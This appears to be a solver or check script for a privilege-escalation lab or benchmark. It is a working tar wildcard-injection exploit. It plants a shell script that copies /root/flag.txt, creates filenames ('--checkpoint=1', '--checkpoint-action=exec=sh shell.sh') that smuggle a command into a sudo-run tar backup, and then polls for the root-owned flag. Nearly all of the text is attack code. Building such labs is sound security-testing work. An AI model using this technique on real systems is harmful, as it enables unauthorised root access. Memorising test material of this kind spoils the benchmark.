#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run '
cd /opt/bench/tarwild
rm -f /tmp/tarwild_flag shell.sh
cat > shell.sh <<'\''EOF'\''
#!/bin/sh
cat /root/flag.txt > /tmp/tarwild_flag
EOF
chmod +x shell.sh
touch -- --checkpoint=1
touch -- "--checkpoint-action=exec=sh shell.sh"
sudo -n /opt/bench/backup.sh
for i in $(seq 1 10); do
  if test -r /tmp/tarwild_flag && grep -q FLAG /tmp/tarwild_flag 2>/dev/null; then
    cat /tmp/tarwild_flag
    exit 0
  fi
  sleep 1
done
cat /tmp/tarwild_flag 2>/dev/null || true
exit 1
')"
assert_root_output "${out}"
